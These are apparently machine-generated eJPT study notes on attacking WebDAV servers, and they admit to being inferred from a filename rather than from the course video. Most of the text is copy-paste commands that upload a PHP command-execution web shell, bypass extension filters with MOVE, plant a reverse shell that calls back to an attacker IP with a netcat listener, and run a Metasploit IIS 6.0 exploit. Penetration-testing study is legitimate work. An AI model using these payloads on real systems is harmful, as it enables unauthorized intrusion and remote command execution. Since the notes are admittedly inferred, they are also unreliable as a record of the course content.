# 07 - WebDAV Vulnerabilities (eJPT) — Study Notes

Note: No transcript was provided. The content below is inferred from the filename and typical eJPT coverage for WebDAV in a Vulnerability Assessment module. Commands and paths reflect common lab setups (e.g., Apache/IIS WebDAV, Metasploitable-style /webdav/ paths). Adjust to your target and scope.

---

## What the video covers (Introduction / big picture)
- What WebDAV is: an HTTP extension enabling file management over the web (methods like PROPFIND, MKCOL, COPY, MOVE, LOCK, UNLOCK, PUT/DELETE).
- How to identify WebDAV on a host and verify supported HTTP methods.
- Common misconfigurations:
  - PUT/DELETE enabled anonymously
  - Write allowed but extension-filtered (bypasses via MOVE)
  - Legacy IIS WebDAV vulnerabilities (e.g., IIS 6.0 ScStoragePathFromUrl)
- Typical exploitation path:
  - Enumerate DAV and methods
  - Test write with davtest/curl
  - Upload a web shell (or use MOVE trick to bypass filters)
  - Trigger shell for command execution or reverse shell
- Cleanup and defensive notes

---

## Flow (ordered)
1. Discover HTTP services and likely WebDAV endpoints.
2. Enumerate HTTP methods and confirm DAV support.
3. Probe write access (anonymous vs. authenticated).
4. Attempt file upload via PUT.
5. If filtered by extension, try MOVE bypass.
6. Confirm execution (web shell or reverse shell).
7. Consider legacy IIS-specific checks (if applicable).
8. Clean up uploaded artifacts.

---

## Tools highlighted
- nmap (http-methods, http-webdav-scan, http-iis-webdav-vuln, http-put scripts)
- curl (OPTIONS, PROPFIND, PUT/DELETE/MOVE/MKCOL)
- davtest (automated WebDAV upload tests)
- cadaver (interactive WebDAV client)
- gobuster or ffuf (to discover DAV paths)
- metasploit (optional, for IIS 6.0 WebDAV RCE)
- netcat (for reverse shells)
- nikto (optional DAV detection plugin)

---

## Typical command walkthrough (detailed, copy-paste friendly)
Legal/ethical reminder: Use only within authorized scope.

Set target variables (adjust as needed):
```bash
export RHOST=10.10.10.10
export RPORT=80
export SCHEME=http
# If you already know the DAV path (e.g., /webdav/). Otherwise, find it first.
export DAV_PATH=/webdav/
export URL=$SCHEME://$RHOST:$RPORT$DAV_PATH
```

1) Discover HTTP services and quick scripts:
```bash
# Quick port sweep
nmap -p- --min-rate 2000 -sS -n -Pn $RHOST

# Service/version detection and basic HTTP/DAV checks
nmap -sV -p80,443,8080,8000,8081,8888 -Pn \
  --script http-methods,http-webdav-scan,http-iis-webdav-vuln \
  $RHOST
```

2) If the DAV path is unknown, brute-force directories:
```bash
# Using gobuster
gobuster dir -u $SCHEME://$RHOST:$RPORT/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,asp,aspx,txt,html -t 40 -k

# Using ffuf
ffuf -u $SCHEME://$RHOST:$RPORT/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.asp,.aspx,.txt,.html -t 40
```

3) Confirm DAV and enumerate methods:
```bash
# Methods on root
curl -i -X OPTIONS $SCHEME://$RHOST:$RPORT/

# Methods on suspected DAV path
curl -i -X OPTIONS $URL

# PROPFIND typically returns 207 Multi-Status on DAV paths
curl -i -X PROPFIND -H "Depth: 1" $URL
```

4) Automated write test with davtest:
```bash
# Anonymous test
davtest -url $URL

# If credentials are needed:
# davtest -url $URL -auth username:password
```

5) Manual write test (PUT) with curl:
```bash
# Create a harmless test file and attempt upload
echo "webdav_test_$(date +%s)" > test.txt
curl -i -T test.txt $URL/test.txt

# Verify retrieval
curl -i $URL/test.txt
```

6) Upload a simple command web shell (PHP example on Apache-like targets):
```bash
# Simple command-exec web shell
cat > shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

# Upload
curl -i -T shell.php $URL/shell.php

# Test execution
curl -s "$URL/shell.php?cmd=id"
```

7) Reverse shell option (PHP):
```bash
# Prepare reverse shell
cp /usr/share/webshells/php/php-reverse-shell.php ./rshell.php
# Set your IP and port
export LHOST=YOUR_ATTACK_IP
export LPORT=4444
sed -i "s/127.0.0.1/$LHOST/" rshell.php
sed -i "s/1234/$LPORT/" rshell.php

# Upload
curl -i -T rshell.php $URL/rshell.php

# Listener
nc -lvnp $LPORT
# Trigger by visiting the URL (browser or curl)
curl -I $URL/rshell.php
```

8) Bypass extension filters with MOVE (upload as .txt then rename to .php/.asp):
```bash
# Upload as .txt
echo "<?php system(\$_GET['cmd']); ?>" > shell.txt
curl -i -T shell.txt $URL/shell.txt

# Rename using MOVE (Destination must be absolute)
curl -i -X MOVE "$URL/shell.txt" -H "Destination: $URL/shell.php"

# Test
curl -s "$URL/shell.php?cmd=whoami"
```

9) Interactive upload with cadaver:
```bash
# If anonymous works, cadaver drops you into a DAV shell
cadaver $URL
# In the cadaver prompt:
# put shell.php
# ls
# quit
```

10) IIS-specific quick check (IIS 6.0 WebDAV RCE detection):
```bash
# Nmap NSE for IIS WebDAV ScStoragePathFromUrl (CVE-2017-7269)
nmap -p$RPORT --script http-iis-webdav-vuln $RHOST

# Metasploit (optional; only if within scope and applicable)
# msfconsole
# use exploit/windows/iis/iis_webdav_scstoragepathfromurl
# set RHOSTS $RHOST
# set RPORT $RPORT
# run
```

11) Clean up:
```bash
# Remove files if policy requires cleanup
curl -i -X DELETE $URL/test.txt
curl -i -X DELETE $URL/shell.php
curl -i -X DELETE $URL/rshell.php
```

---

## Practical tips
- WebDAV is often enabled only on a specific path (e.g., /webdav/, /dav/, /uploads/, /remote.php/webdav). Always test the correct location.
- Check methods at both root and the DAV path. PUT might be disabled on / but allowed on /webdav/.
- A 207 response to PROPFIND strongly indicates DAV. Presence of a “DAV:” header also signals DAV support.
- If upload of .php/.asp is blocked, try:
  - Upload .txt then MOVE to .php/.asp
  - Alternate extensions (.phtml, .shtml, .aspx)
- Destination in MOVE must be an absolute URL and may require the Host header to match vhost.
- Use davtest first; it quickly shows which extensions are writable/executable.
- On Windows/IIS, use .asp/.aspx shells. On Linux/Apache, use .php.
- If auth is required, test for weak/dictionary credentials before exploitation.
- Always remove test files and shells after validation, and document every step for reporting.

---

## Minimal cheat sheet (one-screen flow)
```bash
# Set target
RHOST=10.10.10.10; RPORT=80; SCHEME=http; DAV_PATH=/webdav/; URL=$SCHEME://$RHOST:$RPORT$DAV_PATH

# Find DAV/methods
nmap -sV -p$RPORT -Pn --script http-methods,http-webdav-scan,http-iis-webdav-vuln $RHOST
curl -i -X OPTIONS $URL
curl -i -X PROPFIND -H "Depth: 1" $URL

# Quick DAV write test
davtest -url $URL
echo test > test.txt; curl -i -T test.txt $URL/test.txt; curl -s $URL/test.txt

# Upload shell (PHP)
echo "<?php system(\$_GET['cmd']); ?>" > shell.php
curl -i -T shell.php $URL/shell.php
curl -s "$URL/shell.php?cmd=id"

# MOVE bypass (if .php blocked)
echo "<?php system(\$_GET['cmd']); ?>" > shell.txt
curl -i -T shell.txt $URL/shell.txt
curl -i -X MOVE "$URL/shell.txt" -H "Destination: $URL/shell.php"

# Reverse shell (optional)
LHOST=YOUR_ATTACK_IP; LPORT=4444
cp /usr/share/webshells/php/php-reverse-shell.php rshell.php
sed -i "s/127.0.0.1/$LHOST/; s/1234/$LPORT/" rshell.php
curl -i -T rshell.php $URL/rshell.php
nc -lvnp $LPORT; curl -I $URL/rshell.php

# Cleanup
curl -X DELETE $URL/test.txt; curl -X DELETE $URL/shell.php; curl -X DELETE $URL/rshell.php
```

---

## Summary
- WebDAV expands HTTP with authoring methods; misconfigurations often allow unintended write access.
- Identify DAV and allowed methods with nmap, curl, and davtest. Confirm on the actual DAV path.
- Exploitation commonly involves PUT to upload a test file or web shell; if extensions are filtered, use MOVE to rename after upload.
- For legacy IIS 6.0, check for the well-known WebDAV RCE.
- Keep evidence, clean up after tests, and align actions with scope and rules of engagement.